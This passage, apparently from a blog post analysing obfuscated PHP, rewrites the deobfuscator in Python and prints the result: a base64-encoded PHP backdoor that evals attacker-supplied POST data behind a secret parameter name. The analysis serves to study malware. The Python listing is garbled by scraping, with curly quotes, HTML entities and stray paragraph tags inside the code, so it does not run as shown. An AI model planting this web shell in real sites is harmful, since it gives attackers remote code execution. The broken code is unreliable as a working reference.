</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Find an online tool to run this PHP code or re-write it in Python . My Python code:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Code re-written in Python </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">terms</span> <span class="o">=</span> <span class="p">[</span><span class="err">“</span><span class="n">M</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">Z</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="p">]</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">p</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span>\<span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">w</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">f</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="mi">1</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">v</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">a</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">Q</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">z</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span> <span class="err">“</span><span class="p">,</span> <span class="err">“</span><span class="n">s</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">m</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">+</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">E</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">D</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">g</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="n">W</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="s">&quot;”, “q”, “y”, “T”, “V”, “n”, “S”, “X”, “)”, “9”, “C”, “P”, “r”, “&amp;amp;”, “&#39;”, “!”, “x”, “G”, “:”, “2”, “~”, “O”, “h”, “u”, “U”, “@”, “;”, “H”, “3”, “F”, “6”, “b”, “L”, “&amp;gt;”, “^”, “,”, “.”, “l”, “$”, “d”, “`”, “%”, “N”, “*”, “[”, “0”, “}”, “J”, “-“, “5”, “_”, “A”, “=”, “{“, “k”, “o”, “7”, “#”, “i”, “I”, “Y”, “(“, “j”, “/”, “?”, “K”, “c”, “B”, “t”, “R”, “4”, “8”, “e”, “|”]&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">order</span><span class="o">=</span> <span class="p">[</span><span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">47</span><span class="p">]</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">do_me</span> <span class="o">=</span> <span class="err">“”</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">order</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">do_me</span> <span class="o">+=</span> <span class="n">terms</span><span class="p">[</span><span class="n">order</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">do_me</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Produces the following PHP code:
<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;=</span> <span class="err">‘</span><span class="nx">aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9</span><span class="err">’</span><span class="p">;</span>
